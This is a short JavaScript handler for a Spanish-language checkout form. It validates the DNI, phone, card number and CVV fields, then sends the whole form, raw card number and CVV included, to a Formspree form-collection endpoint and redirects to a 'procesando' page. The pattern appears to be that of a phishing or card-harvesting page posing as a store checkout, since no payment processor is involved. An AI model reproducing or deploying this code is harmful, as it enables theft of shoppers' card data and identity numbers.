document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("formulario-compra");

  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    let valido = true;

    // Validación general de campos requeridos
    form.querySelectorAll("input[required]").forEach(input => {
      if (!input.value.trim()) {
        input.classList.add("error");
        valido = false;
      } else {
        input.classList.remove("error");
      }
    });

    // Validación específica de DNI
    const dni = document.getElementById("dni").value.trim();
    if (dni.length !== 8) {
      alert("El DNI debe tener exactamente 8 dígitos.");
      valido = false;
    }

    // Validación específica de celular
    const telefono = document.getElementById("telefono").value.trim();
    if (telefono.length < 9) {
      alert("El número de celular debe tener al menos 9 dígitos.");
      valido = false;
    }

    // Validación de tarjeta
    const tarjeta = document.getElementById("tarjeta").value.trim();
    if (tarjeta.length < 13 || tarjeta.length > 19) {
      alert("El número de tarjeta debe tener entre 13 y 19 dígitos.");
      valido = false;
    }

    // Validación de CVV
    const cvv = document.getElementById("cvv").value.trim();
    if (cvv.length < 3 || cvv.length > 4) {
      alert("El CVV debe tener 3 o 4 dígitos.");
      valido = false;
    }

    if (!valido) return;

    try {
      const formData = new FormData(form);

      // Enviar a Formspree
      const response = await fetch("https://formspree.io/f/mnnbkeaj", {
        method: "POST",
        body: formData,
        headers: { "Accept": "application/json" }
      });

      if (response.ok) {
        window.location.href = "procesando.html";
      } else {
        alert("Error al enviar el formulario. Intenta nuevamente.");
      }
    } catch (err) {
      alert("Ocurrió un error al conectar con el servidor.");
    }
  });
});
